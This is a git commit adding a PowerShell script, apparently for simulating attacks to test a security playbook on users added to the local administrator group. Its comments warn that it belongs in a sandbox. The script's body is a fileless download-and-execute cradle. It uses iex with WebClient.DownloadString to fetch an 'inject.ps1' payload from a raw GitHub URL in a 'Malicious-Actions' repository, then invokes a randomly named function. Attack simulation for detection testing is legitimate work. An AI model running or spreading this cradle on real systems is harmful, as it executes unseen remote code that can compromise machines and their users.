33c05a6c5df9498cde31f9e1fb27cf7954df51f7
Oren Maoz Sharabi <108679419+SilentProcess87@users.noreply.github.com>
2024-12-10 12:31:13 +0100

    Add files via upload

---
+++ Playbooks - User Added to Local Administrator Group/Malicious Actions - Execute on Sandbox only.ps1
@@ -0,0 +1,10 @@
+# The script provided contains potentially harmful actions. 
+# It is strongly advised to execute this script exclusively within a secure and isolated sandbox environment. 
+# Do not execute it in any production or on-premises environment under any circumstances.
+
+################################## Read the text above ################################################
+
+$url = "https://raw.githubusercontent.com/norsemen-local/Malicious-Actions/refs/heads/main/Case%201%20-%20Fileless%20Attack/inject.ps1"
+iex ((New-Object net.webclient).DownloadString(($url))
+Invoke-HGFXNPCQTZ
+
